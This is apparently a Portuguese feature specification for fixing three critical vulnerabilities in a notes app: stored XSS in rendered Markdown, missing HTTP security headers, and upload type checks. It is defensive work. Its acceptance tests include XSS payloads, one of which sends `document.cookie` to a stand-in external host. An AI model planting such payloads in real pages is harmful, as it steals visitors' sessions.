# Feature Specification: Correção de Vulnerabilidades Críticas de Segurança

**Feature Branch**: `004-fix-critical-vulns`  
**Created**: 2026-04-08  
**Status**: Draft  
**Input**: User description: "Considerando o relatório de vulnerabilidades em audit/security-report-2026-04-08.md, quero resolver as Vulnerabilidades Críticas, e apenas as Vulnerabilidades Críticas."

## Contexto

Este documento especifica a correção das três vulnerabilidades classificadas como **Críticas** no relatório de segurança de 2026-04-08 (C-01, C-02, C-03). Vulnerabilidades de outras severidades estão fora do escopo desta entrega.

---

## User Scenarios & Testing *(mandatory)*

### User Story 1 - Conteúdo malicioso em nota não executa no navegador do visitante (Priority: P1)

Um visitante que acessa o link público de uma nota compartilhada não deve ter código malicioso executado em seu navegador, mesmo que o dono da nota tenha escrito conteúdo com elementos HTML perigosos (intencionalmente ou não). O mesmo vale para o próprio dono ao visualizar suas notas na interface autenticada.

**Why this priority**: Esta é a vulnerabilidade de maior impacto imediato — explorável sem autenticação por qualquer pessoa que possua o link de compartilhamento. Um atacante pode roubar dados da sessão ou redirecionar o visitante para sites maliciosos.

**Independent Test**: Pode ser testado de forma isolada: criar uma nota com conteúdo `<img src=x onerror=alert(1)>`, gerar um link público, abrir no navegador — nenhum alert deve disparar. Isso demonstra proteção completa para o caso de uso mais crítico.

**Acceptance Scenarios**:

1. **Given** uma nota contendo `<script>alert('xss')</script>` no conteúdo, **When** um visitante acessa o link público da nota, **Then** o script não é executado e o texto é exibido de forma segura ou ignorado.
2. **Given** uma nota contendo `<img src=x onerror="fetch('https://externo.com/?c='+document.cookie)">`, **When** qualquer usuário (autenticado ou não) visualiza a nota renderizada, **Then** a requisição externa não é disparada.
3. **Given** uma nota com Markdown comum (negrito, itálico, links, código), **When** visualizada na interface, **Then** o Markdown continua sendo renderizado corretamente sem degradação da experiência.
4. **Given** uma nota com imagens incorporadas via Markdown `![alt](url)`, **When** visualizada, **Then** as imagens continuam sendo exibidas normalmente.

---

### User Story 2 - Navegador aplica restrições de segurança definidas pelo servidor (Priority: P2)

O servidor deve comunicar ao navegador de cada visitante (autenticado ou público) quais origens, scripts e recursos são permitidos, impedindo categorias inteiras de ataques baseados em browser — como clickjacking (incorporar a aplicação em um iframe malicioso) e exfiltração do token de compartilhamento via headers HTTP.

**Why this priority**: Sem essas restrições, outros vetores de ataque permanecem abertos mesmo após corrigir C-01. Os headers funcionam como uma camada de defesa independente que protege tanto o dono da nota quanto os visitantes de links públicos.

**Independent Test**: Testável com `curl -I` na URL da aplicação — os headers de segurança devem estar presentes em todas as respostas HTTP. Entrega proteção contra clickjacking e vazamento de tokens mesmo sem nenhuma outra mudança.

**Acceptance Scenarios**:

1. **Given** qualquer requisição à aplicação (páginas autenticadas ou públicas), **When** o servidor responde, **Then** os headers de segurança HTTP padrão estão presentes na resposta.
2. **Given** um ator malicioso tentando incorporar a aplicação em um `<iframe>` em outro domínio, **When** o navegador carrega a página, **Then** o navegador bloqueia o carregamento do iframe.
3. **Given** um link de compartilhamento `/s/{token}` clicado em uma página externa, **When** o navegador faz a requisição, **Then** o token de compartilhamento não é enviado no header `Referer` para serviços de terceiros (ex.: CDN de scripts).
4. **Given** scripts inline ou de origens não autorizadas, **When** a página carrega, **Then** o navegador os bloqueia conforme a política definida pelo servidor.

---

### User Story 3 - Uploads de arquivo são validados pelo conteúdo real, não pelo que o cliente declara (Priority: P3)

Ao fazer upload de um arquivo como anexo de uma nota, o sistema deve verificar o tipo real do arquivo pelo seu conteúdo binário — não apenas confiar no que o navegador ou cliente informou. Arquivos SVG, que permitem incorporar scripts executáveis, devem ser rejeitados.

**Why this priority**: Permite que um atacante autenticado armazene arquivos maliciosos no servidor que, quando acessados por outros (ou por si mesmo em outro contexto), executam código. É menos urgente que C-01 por requerer autenticação prévia.

**Independent Test**: Testável de forma isolada: tentar fazer upload de um arquivo `.html` com `Content-Type: image/jpeg` — deve ser rejeitado. Tentar upload de `.svg` — deve ser rejeitado. Confirma que a validação é baseada em conteúdo real.

**Acceptance Scenarios**:

1. **Given** um arquivo `.html` enviado com `Content-Type: image/jpeg` declarado pelo cliente, **When** o usuário tenta fazer upload, **Then** o servidor rejeita o arquivo com mensagem de erro indicando tipo não suportado.
2. **Given** um arquivo `.svg` (mesmo com `Content-Type: image/svg+xml`), **When** o usuário tenta fazer upload, **Then** o servidor rejeita o arquivo — SVG não está na lista de tipos permitidos.
3. **Given** um arquivo JPEG legítimo, **When** o usuário faz upload, **Then** o upload é aceito normalmente e o arquivo fica disponível como anexo.
4. **Given** um arquivo PNG legítimo enviado com `Content-Type: image/jpeg` incorreto pelo cliente, **When** o servidor inspeciona o conteúdo real, **Then** o upload é aceito se o tipo real (PNG) estiver na lista permitida, independentemente do que o cliente declarou.

---

### Edge Cases

- O que acontece quando uma nota tem Markdown válido que contém elementos HTML não perigosos (ex.: `<br>`, `<strong>`)? O sistema deve preservar a renderização correta.
- O que acontece quando o visitante de um link público tem JavaScript desabilitado? O conteúdo estático deve ser exibido sem erros.
- O que acontece quando um script CDN legítimo (ex.: biblioteca de Markdown) é bloqueado pela política de segurança? A política deve permitir explicitamente os CDNs utilizados pela aplicação.
- O que acontece com arquivos de tipo desconhecido que não podem ser identificados pelos primeiros bytes? O sistema deve rejeitar por padrão (deny-by-default).
- O que acontece com o Service Worker após aplicação da CSP? O SW deve continuar sendo registrado e interceptando requisições normalmente — a política deve permitir explicitamente o script `sw.js` e suas operações de cache.

---

## Requirements *(mandatory)*

### Functional Requirements

- **FR-001**: O sistema DEVE sanitizar o HTML resultante da renderização de Markdown antes de exibi-lo no navegador, removendo elementos e atributos capazes de executar código.
- **FR-002**: A sanitização DEVE ser aplicada em todos os pontos da interface onde notas são renderizadas como Markdown — incluindo a página de compartilhamento público, a lista principal de notas, a lixeira e a visualização de notas compartilhadas.
- **FR-003**: O servidor DEVE incluir em todas as respostas HTTP os seguintes headers de segurança: `Content-Security-Policy`, `X-Frame-Options`, `X-Content-Type-Options`, `Referrer-Policy` e `Permissions-Policy`.
- **FR-004**: A `Content-Security-Policy` DEVE permitir explicitamente os scripts e estilos de CDN externos que a aplicação já utiliza, sem bloquear funcionalidades existentes.
- **FR-005**: O sistema DEVE verificar o tipo real de cada arquivo enviado via upload inspecionando o conteúdo binário do arquivo, ignorando o tipo declarado pelo cliente.
- **FR-006**: O tipo `image/svg+xml` DEVE ser removido da lista de tipos de arquivo permitidos para upload.
- **FR-007**: O sistema DEVE rejeitar uploads de arquivos cujo tipo real (detectado por conteúdo) não esteja na lista de tipos permitidos, retornando uma mensagem de erro genérica ao usuário ("Tipo de arquivo não suportado") sem expor a lista de tipos aceitos.

### Key Entities

- **Nota**: Conteúdo em Markdown criado pelo usuário, potencialmente com HTML embutido — deve ser sanitizado antes de renderizar.
- **Link de Compartilhamento**: URL pública (`/s/{token}`) acessível sem autenticação — ponto de maior exposição para C-01 e C-02.
- **Arquivo Anexo**: Arquivo binário enviado pelo usuário associado a uma nota — tipo real deve ser validado no servidor.
- **Header de Segurança HTTP**: Instrução enviada pelo servidor ao navegador definindo políticas de execução de conteúdo — deve estar presente em todas as respostas.

---

## Success Criteria *(mandatory)*

### Measurable Outcomes

- **SC-001**: 100% das páginas da aplicação (autenticadas e públicas) retornam os 5 headers de segurança exigidos em toda e qualquer resposta HTTP. A `Content-Security-Policy` é entregue inicialmente em modo `Report-Only` e promovida para enforce após validação sem falsos positivos.
- **SC-002**: Nenhum payload XSS padrão (lista OWASP XSS Filter Evasion) executado em notas com link de compartilhamento público resulta em execução de código no navegador do visitante.
- **SC-003**: 100% dos uploads de arquivos com extensão ou conteúdo binário incompatível com os tipos permitidos são rejeitados pelo servidor antes de serem armazenados.
- **SC-004**: Nenhuma funcionalidade existente da aplicação (renderização de Markdown, upload de imagens legítimas, acesso a links públicos, funcionamento do Service Worker / PWA offline) é interrompida após a implementação das correções.
- **SC-005**: A aplicação não apresenta erros no console do navegador relacionados a bloqueios da Content-Security-Policy para uso normal (criar notas, visualizar, compartilhar, fazer upload).

---

## Assumptions

- O escopo é restrito às três vulnerabilidades críticas (C-01, C-02, C-03). Vulnerabilidades de severidade Alta, Média ou Baixa do mesmo relatório não serão abordadas nesta entrega.
- A aplicação utiliza uma biblioteca de sanitização de HTML amplamente adotada para neutralizar o output do renderizador de Markdown (ex.: DOMPurify ou equivalente) — a escolha da biblioteca é decisão de implementação.
- Os CDNs externos atualmente utilizados pela aplicação (ex.: para Marked.js) continuarão sendo utilizados; a Content-Security-Policy será configurada para permitir esses CDNs explicitamente.
- Tipos de arquivo permitidos para upload atualmente incluem formatos de imagem raster (JPEG, PNG, GIF, WebP) e documentos comuns — SVG será removido; a lista final é decisão de implementação baseada nos tipos já suportados.
- O ambiente de produção está atrás de um proxy reverso (ex.: nginx, Traefik) que pode ou não adicionar alguns headers; os headers serão definidos na camada da aplicação para garantia independente de infraestrutura.
- Não há requisitos de compatibilidade com navegadores legados (IE11 ou anterior) — as políticas de segurança modernas serão aplicadas sem fallbacks.
- A implantação da `Content-Security-Policy` seguirá duas fases: **Fase 1** em modo `Content-Security-Policy-Report-Only` (coleta violações sem bloquear) para validar a política sem impacto em produção; **Fase 2** migração para `Content-Security-Policy` enforce após confirmar ausência de falsos positivos.

## Clarifications

### Session 2026-04-08

- Q: A CSP deve ser deployada em modo report-only antes de enforçar? → A: Sim — Fase 1 report-only, Fase 2 enforce após validação.
- Q: Compatibilidade com Service Worker (PWA) é critério de aceite desta entrega? → A: Sim — SW deve continuar funcionando normalmente após aplicação dos headers de segurança.
- Q: Mensagem de erro para upload rejeitado deve listar tipos aceitos? → A: Não — mensagem genérica "Tipo de arquivo não suportado" sem expor lista de tipos.
